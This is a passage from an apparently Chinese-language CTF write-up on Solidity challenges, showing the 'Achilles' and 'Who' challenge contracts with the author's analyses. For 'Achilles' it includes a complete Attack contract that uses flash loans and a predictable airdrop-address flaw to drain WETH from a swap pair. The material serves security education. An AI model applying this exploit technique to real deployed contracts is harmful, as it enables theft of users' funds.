&#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.</span><br><span class="line">     *</span><br><span class="line">     * Does not update the allowance amount in case of infinite allowance.</span><br><span class="line">     * Revert if not enough allowance is available.</span><br><span class="line">     *</span><br><span class="line">     * Might emit an &#123;Approval&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Hook that is called before any transfer of tokens. This includes</span><br><span class="line">     * minting and burning.</span><br><span class="line">     *</span><br><span class="line">     * Calling conditions:</span><br><span class="line">     *</span><br><span class="line">     * - when `from` and `to` are both non-zero, `amount` of ``from``&#x27;s tokens</span><br><span class="line">     * will be transferred to `to`.</span><br><span class="line">     * - when `from` is zero, `amount` tokens will be minted for `to`.</span><br><span class="line">     * - when `to` is zero, `amount` of ``from``&#x27;s tokens will be burned.</span><br><span class="line">     * - `from` and `to` are never both zero.</span><br><span class="line">     *</span><br><span class="line">     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].</span><br><span class="line">     */</span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual &#123;&#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Hook that is called after any transfer of tokens. This includes</span><br><span class="line">     * minting and burning.</span><br><span class="line">     *</span><br><span class="line">     * Calling conditions:</span><br><span class="line">     *</span><br><span class="line">     * - when `from` and `to` are both non-zero, `amount` of ``from``&#x27;s tokens</span><br><span class="line">     * has been transferred to `to`.</span><br><span class="line">     * - when `from` is zero, `amount` tokens have been minted for `to`.</span><br><span class="line">     * - when `to` is zero, `amount` of ``from``&#x27;s tokens have been burned.</span><br><span class="line">     * - `from` and `to` are never both zero.</span><br><span class="line">     *</span><br><span class="line">     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].</span><br><span class="line">     */</span><br><span class="line">    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: contracts/Achil/contracts/WETH.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract WETH is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;WETH&quot;, &quot;WETH&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 1000 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="Achilles-sol"><a href="#Achilles-sol" class="headerlink" title="Achilles.sol"></a>Achilles.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Interface.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Achilles &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    IERC20 public weth;</span><br><span class="line">    IPancakePair public pair;</span><br><span class="line"></span><br><span class="line">    uint256 public _totalSupply;</span><br><span class="line">    uint256 private airdropAmount = 0;</span><br><span class="line">    uint256 public block2;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    constructor(address _pair, address _weth) &#123;</span><br><span class="line">        _mint(msg.sender, 1000 ether);</span><br><span class="line">        pair = IPancakePair(_pair);</span><br><span class="line">        weth = IERC20(_weth);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        uint256 balance = _balances[account];</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Airdrop(uint256 amount) public &#123;</span><br><span class="line">        require(weth.balanceOf(address(pair)) / this.balanceOf(address(pair)) &gt; 5, &quot;not enough price!&quot;);</span><br><span class="line">        airdropAmount = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address sender, address to, uint256 amount) private &#123;</span><br><span class="line">        require(_balances[sender] &gt;= amount, &quot;balance exc!&quot;);</span><br><span class="line">        _balances[sender] = _balances[sender] - amount;</span><br><span class="line">        _balances[to] = _balances[to] + amount;</span><br><span class="line">        _airdrop(sender, to, amount);</span><br><span class="line">        emit Transfer(sender, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) private &#123;</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _airdrop(address from, address to, uint256 tAmount) private &#123;</span><br><span class="line">        block2 = block.number;</span><br><span class="line">        uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));</span><br><span class="line">        address airdropAddress;</span><br><span class="line">        for (uint256 i; i &lt; airdropAmount;) &#123;</span><br><span class="line">            airdropAddress = address(uint160(seed | tAmount));</span><br><span class="line">            _balances[airdropAddress] = airdropAmount;</span><br><span class="line">            emit Transfer(airdropAddress, airdropAddress, airdropAmount);</span><br><span class="line">            unchecked&#123;</span><br><span class="line">                ++i;</span><br><span class="line">                seed = seed &gt;&gt; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _totalSupply += amount;</span><br><span class="line"></span><br><span class="line">        _balances[account] += amount;</span><br><span class="line"></span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        uint256 accountBalance = _balances[account];</span><br><span class="line">        require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[account] = accountBalance - amount;</span><br><span class="line">            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _afterTokenTransfer(address from, address to, uint256 amount) internal &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SetUp-sol"><a href="#SetUp-sol" class="headerlink" title="SetUp.sol"></a>SetUp.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Achilles.sol&quot;;</span><br><span class="line">import &quot;./WETH.sol&quot;;</span><br><span class="line">import &quot;./Interface.sol&quot;;</span><br><span class="line">import &quot;./PancakeSwap.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SetUp &#123;</span><br><span class="line"></span><br><span class="line">    PancakePair public pair = new PancakePair();</span><br><span class="line">    WETH public weth = new WETH();</span><br><span class="line">    Achilles public achilles = new Achilles(address(pair), address(weth));</span><br><span class="line">    address public yourAddress;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        pair.initialize(address(achilles), address(weth));</span><br><span class="line">        achilles.transfer(address(pair), achilles.balanceOf(address(this)));</span><br><span class="line">        weth.transfer(address(pair), weth.balanceOf(address(this)));</span><br><span class="line">        pair.sync();</span><br><span class="line">        yourAddress = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        require(pair.unlocked()==1);</span><br><span class="line">        require(weth.balanceOf(yourAddress) &gt;= 100 ether);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题有些复杂了，但是算比较有趣，首先这道题的交易所当中借贷是不需要利息的，所以在做题过程中不用考虑利息的存在。当在看<code>Achilles</code>合约时，会发现<code>_airdrop()</code>函数中这几段代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));</span><br><span class="line">address airdropAddress;</span><br><span class="line">airdropAddress = address(uint160(seed | tAmount));</span><br><span class="line">            _balances[airdropAddress] = airdropAmount;</span><br></pre></td></tr></table></figure>

<p>看到这段代码就可以想到，可以自己控制<code>from</code>和<code>to</code>，然后使<code>tAmount</code>的值为<code>0</code>，来控制<code>airdropAddress</code>的值，因为当<code>tAmount</code>为<code>0</code>时，<code>seed</code>和它相或可得<code>seed</code>本身，同时又因为这段函数需要<code>transfer()</code>来调用，所以当<code>tAmount</code>为<code>0</code>时可以任意输入<code>from</code>和<code>to</code>。但在这之前还需要使<code>airdropAmount</code>变得大于<code>0</code>，才能对自己<code>airdropAddress</code>的<code>_balances</code>进行赋值。在这里我最开始想的是使<code>airdropAddress</code>的值变为我的账户，使得它的<code>ach</code>变得很大，即可调走交易所中的<code>weth</code>，但后来我发现这样的话会使得<code>airdropAmount</code>变得很大，导致<code>for</code>循环多次从而使得<code>gas</code>耗尽而调用失败，所以我换了一种思路。让<code>airdropAmount</code>的值为<code>1</code>，先从交易所借来<code>850 ether</code>使得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(weth.balanceOf(address(pair)) / this.balanceOf(address(pair)) &gt; 5, &quot;not enough price!&quot;);</span><br></pre></td></tr></table></figure>

<p>这段条件成立从而控制<code>airdropAmount</code>，之后将所有<code>weth</code>还给交易所，在通过<code>_airdrop</code>给交易所地址的<code>ach</code>余额赋值为<code>1</code>,再通过交易所的<code>sync()</code>函数更新，再将<code>airdropAmount</code>的值改为<code>112</code>即可，然后对攻击合约的余额赋值为<code>112</code>，再然后通过交易所借走<code>100 ether</code>的<code>weth</code>，再还给交易所<code>112 wei</code>的<code>ach</code>即可</p>
<h4 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./PancakeSwap.sol&quot;;</span><br><span class="line">import &quot;./WETH.sol&quot;;</span><br><span class="line">import &quot;./Achilles.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack is IPancakeCallee&#123;</span><br><span class="line">    PancakePair public pair;</span><br><span class="line">    WETH public weth;</span><br><span class="line">    Achilles public ach;</span><br><span class="line">    uint256 public block1;</span><br><span class="line">    address public c;</span><br><span class="line">    address public e; </span><br><span class="line"></span><br><span class="line">    constructor(address _pair, address _weth, address _ach)&#123;</span><br><span class="line">        pair = PancakePair(_pair);</span><br><span class="line">        weth = WETH(_weth);</span><br><span class="line">        ach = Achilles(_ach);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashloan1() public &#123;</span><br><span class="line">        pair.swap(850000000000000000000, 0, address(this), &#x27;0x01&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashloan2() public &#123;</span><br><span class="line">        pair.swap(0, 100000000000000000000, address(this), &#x27;0x01&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external&#123;</span><br><span class="line">        if(amount1 == 0)&#123;</span><br><span class="line">            ach.Airdrop(1);</span><br><span class="line">            ach.transfer(address(pair),850000000000000000000);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            ach.transfer(address(pair),111);</span><br><span class="line">            weth.transfer(address(tx.origin),100000000000000000000);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        block1 = block.number;</span><br><span class="line">        address a = address((uint160(address(this))|uint160(block1))^uint160(address(pair))^uint160(address(this)));</span><br><span class="line">        ach.transferFrom(address(this),a,0);</span><br><span class="line">        pair.sync();</span><br><span class="line">        c = address(uint160((uint160(address(this)) | block1) ^ (uint160(address(this)) ^ uint160(a))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack1() public&#123;</span><br><span class="line">        block1 = block.number;</span><br><span class="line">        ach.Airdrop(112);</span><br><span class="line">        address b = address(uint160(address(this))&amp;uint160(block1)^uint160(block.number)^uint160(address(this)));</span><br><span class="line">        e = address(uint160((uint160(address(this)) | block1) ^ (uint160(address(this)) ^ uint160(b))));</span><br><span class="line">        ach.transfer(b,0);</span><br><span class="line">        ach.Airdrop(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用流程<code>flashloan1() =&gt; attack() =&gt; attack1() =&gt; flashloan2()</code></p>
<h3 id="五-Who"><a href="#五-Who" class="headerlink" title="五.Who"></a>五.Who</h3><h4 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">    address who;</span><br><span class="line">    mapping (uint256 =&gt; mapping (address =&gt; bool)) public stats;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    function setup() external &#123;</span><br><span class="line">        require(uint256(uint160(msg.sender)) % 1000 == 137, &quot;!good caller&quot;);</span><br><span class="line">        who = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage1() external &#123;</span><br><span class="line">        require(msg.sender == who, &quot;stage1: !setup&quot;);</span><br><span class="line">        stats[1][msg.sender] = true;</span><br><span class="line"></span><br><span class="line">        (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;check()&quot;));</span><br><span class="line">        require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked(&quot;1337&quot;)), &quot;stage1: !check&quot;);</span><br><span class="line"></span><br><span class="line">        (, data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;check()&quot;));</span><br><span class="line">        require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked(&quot;13337&quot;)), &quot;stage1: !check2&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function stage2() external &#123;</span><br><span class="line">        require(stats[1][msg.sender], &quot;goto stage1&quot;);</span><br><span class="line">        stats[2][msg.sender] = true;</span><br><span class="line">        require(this._stage2() == 7, &quot;!stage2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _stage2() external payable returns (uint x) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            x = 1;</span><br><span class="line">            try this._stage2() returns (uint x_) &#123;</span><br><span class="line">                x += x_;</span><br><span class="line">            &#125; catch &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage3() external &#123;</span><br><span class="line">        require(stats[2][msg.sender], &quot;goto stage2&quot;);</span><br><span class="line">        stats[3][msg.sender] = true;</span><br><span class="line">        uint[] memory challenge = new uint[](8);</span><br><span class="line"></span><br><span class="line">        challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;</span><br><span class="line">        challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;</span><br><span class="line">        challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;</span><br><span class="line">        challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;</span><br><span class="line">        challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;</span><br><span class="line">        challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;</span><br><span class="line">        challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;</span><br><span class="line">        challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        (, bytes memory data) = msg.sender.staticcall&#123;gas: 3_888&#125;(abi.encodeWithSignature(&quot;sort(uint256[])&quot;, challenge));</span><br><span class="line">        uint[] memory answer = abi.decode(data, (uint[]));</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">            for(uint j=i+1 ; j&lt;8 ; j++) &#123;</span><br><span class="line">                if (challenge[i] &gt; challenge[j]) &#123;</span><br><span class="line">                    uint tmp = challenge[i];</span><br><span class="line">                    challenge[i] = challenge[j];</span><br><span class="line">                    challenge[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">            require(challenge[i] == answer[i], &quot;stage3: !sort&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage4() external &#123;</span><br><span class="line">        require(stats[3][msg.sender], &quot;goto stage3&quot;);</span><br><span class="line">        (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;pos()&quot;));</span><br><span class="line">        bytes32 pos = abi.decode(data, (bytes32));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(pos, 0x1)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return stats[4][who];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是一个闯关性质的题目，首先<code>setup()</code>的限制可以用<code>create2()</code>来解决，之后是<code>stage1()</code>，这一关是让攻击合约的<code>check()</code>函数在两次静态调用时返回两个不同的数据(静态调用不允许修改任何链上的状态)，我们可以利用相同地址在两次调用时所耗费的<code>gas</code>不同这一原理即可。</p>
<p>接下来是<code>stage2()</code>，这一关是需要调用<code>_stage2()</code>的返回值为7，可以看到这个函数是不断递归调用自身的，所以想让它的返回值为7，只需要在特定的值使得<code>gas</code>耗尽即可(注意到<code>EVM</code>在调用其他合约的时候会保留<code>1/64</code>的<code>gas</code>，所以除了最后一层会·<code>revert</code>以外，其他的调用都可以正常返回)。</p>
<p>在之后是<code>stage3()</code>，这一关是在获取<code>block.timestamp</code>，与不同的位数想与之后，让我们在<code>3888</code>的<code>gas</code>下去进行冒泡排序，很明显这些<code>gas</code>不够，但是我们要知道在同一笔交易中获取到区块信息是相同的，所以我们可以在一个函数中获取<code>block.timestamp</code>，之后进行排序并存入的<code>storge</code>中，并调用<code>stage3</code>，再让<code>sort(uint256[])</code>函数返回排好序的数组即可。</p>
<p>最后是<code>stage4()</code>，这一关是考查关于映射的存储方式，我们只需要计算出<code>stats[4][who]</code>的地址并用<code>pos()</code>返回即可。</p>
<p>对应于映射键的值 k is located at keccak256(h(k) . p) where . 是串联的，并且 h 是根据键的类型应用于键的函数：</p>
<ul>
<li><p>对于值类型， h 将值填充为32字节的方式与在内存中存储值时的方式相同。</p>
</li>
<li><p>对于字符串和字节数组， h 计算 keccak256 未填充数据的哈希。</p>
</li>
</ul>
<p>如果映射值是非值类型，则计算的槽标记数据的开始。例如，如果值是结构类型，则必须添加与结构成员相对应的偏移量才能到达该成员。</p>
<p>在这道题中<code>mapping</code>位于插槽<code>1</code>，所以可以得出第一个映射键值<code>4</code>对应的存储地址是<code>keccak256(abi.encode(4,1))</code>，而第二个键值<code>who</code>就可以得知对应存储地址为<code>keccak256(abi.encode(address(this),keccak256(abi.encode(4,1))))</code></p>
